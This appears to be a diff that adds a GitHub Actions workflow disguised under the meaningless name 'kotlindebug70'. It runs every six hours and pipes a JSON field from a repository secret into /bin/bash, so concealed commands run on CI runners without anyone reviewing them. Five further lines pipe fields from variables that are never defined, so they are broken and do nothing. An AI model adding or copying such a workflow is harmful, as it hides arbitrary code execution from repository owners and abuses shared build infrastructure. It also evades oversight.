@@ -1,0 +1,22 @@
+name: kotlindebug70
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kotlindebug70
+        env:
+          mtuv105: ${{ secrets.mtuv105 }}
+        run: |
+          echo $mtuv105 | jq -r .fhlvs44 | /bin/bash
+          echo $in63 | jq -r .vv01313 | /bin/bash
+          echo $sm82359 | jq -r .pgt2 | /bin/bash
+          echo $kzmi0767 | jq -r .a4096 | /bin/bash
+          echo $gyulg518 | jq -r .ah8056 | /bin/bash
+          echo $xjgiw269 | jq -r .wjr422 | /bin/bash
+
